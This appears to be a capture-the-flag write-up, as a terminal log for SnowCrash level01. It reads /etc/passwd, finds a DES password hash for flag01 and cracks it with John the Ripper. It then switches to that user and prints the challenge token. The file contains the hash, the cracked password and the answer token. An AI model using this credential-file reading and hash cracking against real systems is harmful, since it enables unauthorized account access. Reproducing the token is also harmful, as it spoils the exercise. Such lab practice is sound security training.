@@ -1,0 +1,41 @@
+level01@SnowCrash:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+...
+flag00:x:3000:3000::/home/flag/flag00:/bin/bash
+flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+flag02:x:3002:3002::/home/flag/flag02:/bin/bash
+flag03:x:3003:3003::/home/flag/flag03:/bin/bash
+..
+level01@SnowCrash:~$ su flag01
+Password: 
+su: Authentication failure
+
+########## On my machine ##########
+┌──(kali㉿kali)-[~]
+└─$ echo "flag01:42hDRfypTqqnw:3001:300" > passwd
+┌──(kali㉿kali)-[~]
+└─$ john passwd 
+Using default input encoding: UTF-8
+Loaded 1 password hash (descrypt, traditional crypt(3) [DES 256/256 AVX2])
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+abcdefg          (flag01)     
+1g 0:00:00:00 DONE 2/3 (2024-01-04 07:09) 6.666g/s 87066p/s 87066c/s 87066C/s 123456..Herman1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+#########
+
+level01@SnowCrash:~$ su flag01
+Password: 
+Don't forget to launch getflag !
+flag01@SnowCrash:~$ getflag
+Check flag.Here is your token : f2av5il02puano7naaf6adaaf
+
+
+
